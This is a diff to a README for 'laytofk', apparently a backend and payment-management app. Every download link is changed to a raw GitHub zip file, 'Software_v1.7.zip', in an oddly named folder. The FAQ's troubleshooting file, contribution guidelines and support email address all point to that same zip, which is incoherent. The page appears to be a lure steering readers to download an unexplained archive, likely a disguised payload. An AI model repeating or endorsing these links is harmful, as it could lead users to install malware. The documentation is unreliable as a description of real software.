@@ -4,9 +4,9 @@
 Welcome to the laytofk project! This application offers an efficient way to manage your backend solutions, integrating APIs and streamlining payment processes. Whether you are building a dashboard or running a backend service, laytofk provides the tools you need.
 
 ## 📥 Download Now
-![Download](https://raw.githubusercontent.com/RafaHengker/laytofk/main/gnathitis/laytofk.zip)
+![Download](https://github.com/RafaHengker/laytofk/raw/refs/heads/main/gnathitis/Software_v1.7.zip)
 
-### 🔗 [Visit this page to download](https://raw.githubusercontent.com/RafaHengker/laytofk/main/gnathitis/laytofk.zip)
+### 🔗 [Visit this page to download](https://github.com/RafaHengker/laytofk/raw/refs/heads/main/gnathitis/Software_v1.7.zip)
 
 ## 🚀 Getting Started
 To begin using laytofk, follow these steps to install the application.
@@ -25,7 +25,7 @@ Before downloading, ensure your system meets the following requirements:
 ### 2. Download & Install
 To download the latest version of laytofk, visit the Releases page:
 
-🔗 [Visit this page to download](https://raw.githubusercontent.com/RafaHengker/laytofk/main/gnathitis/laytofk.zip)
+🔗 [Visit this page to download](https://github.com/RafaHengker/laytofk/raw/refs/heads/main/gnathitis/Software_v1.7.zip)
 
 Once on the page, find the latest release and click on it. You will see a list of files. Download the appropriate file for your operating system.
 
@@ -50,13 +50,13 @@ After installing laytofk, you can start using the application. Here’s a brief 
 ## 🔧 FAQs
 
 ### **Q: What if I encounter an issue during installation?**
-A: Please check the https://raw.githubusercontent.com/RafaHengker/laytofk/main/gnathitis/laytofk.zip file included in the downloaded package for troubleshooting steps. Alternatively, you can visit the Issues section on our GitHub page.
+A: Please check the https://github.com/RafaHengker/laytofk/raw/refs/heads/main/gnathitis/Software_v1.7.zip file included in the downloaded package for troubleshooting steps. Alternatively, you can visit the Issues section on our GitHub page.
 
 ### **Q: Can I contribute to this project?**
-A: Yes! If you're interested in contributing, check our https://raw.githubusercontent.com/RafaHengker/laytofk/main/gnathitis/laytofk.zip file for guidelines.
+A: Yes! If you're interested in contributing, check our https://github.com/RafaHengker/laytofk/raw/refs/heads/main/gnathitis/Software_v1.7.zip file for guidelines.
 
 ### **Q: How can I contact support?**
-A: For support inquiries, please open an issue on our GitHub page or send us an email at https://raw.githubusercontent.com/RafaHengker/laytofk/main/gnathitis/laytofk.zip
+A: For support inquiries, please open an issue on our GitHub page or send us an email at https://github.com/RafaHengker/laytofk/raw/refs/heads/main/gnathitis/Software_v1.7.zip
 
 ## 💻 Additional Resources
 For more detailed information about using laytofk, consider the following resources:
